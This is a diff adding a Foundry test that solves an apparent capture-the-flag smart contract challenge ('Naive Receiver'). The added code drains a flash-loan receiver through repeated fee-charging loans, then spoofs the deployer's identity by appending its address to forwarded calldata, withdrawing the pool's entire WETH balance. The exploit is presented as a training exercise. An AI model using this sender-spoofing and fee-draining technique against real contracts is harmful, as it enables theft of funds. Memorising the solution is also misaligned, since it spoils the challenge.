@@ -6,7 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
-
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
@@ -77,7 +77,46 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // Build 11 calls for multicall: 10 flash loans + 1 spoofed withdraw
+        bytes[] memory calls = new bytes[](11);
+
+        // 10 flash loans targeting FlashLoanReceiver — each costs 1 ETH fee, draining its 10 WETH
+        for (uint256 i = 0; i < 10; i++) {
+            calls[i] = abi.encodeCall(
+                NaiveReceiverPool.flashLoan,
+                (IERC3156FlashBorrower(address(receiver)), address(weth), 0, bytes(""))
+            );
+        }
+
+        // Withdraw all 1010 WETH to recovery, with deployer address appended.
+        // Inside delegatecall, _msgSender() reads the last 20 bytes of msg.data
+        // as the sender — so it thinks deployer is calling withdraw.
+        calls[10] = abi.encodePacked(
+            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+            bytes20(deployer)
+        );
+
+        // Wrap in a forwarder request signed by player
+        bytes memory data = abi.encodeCall(Multicall.multicall, (calls));
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 30_000_000,
+            nonce: forwarder.nonces(player),
+            data: data,
+            deadline: block.timestamp + 1 hours
+        });
+
+        // EIP-712 signature
+        bytes32 digest = keccak256(
+            abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request))
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+
+        // Single transaction through the forwarder
+        forwarder.execute(request, abi.encodePacked(r, s, v));
     }
 
     /**
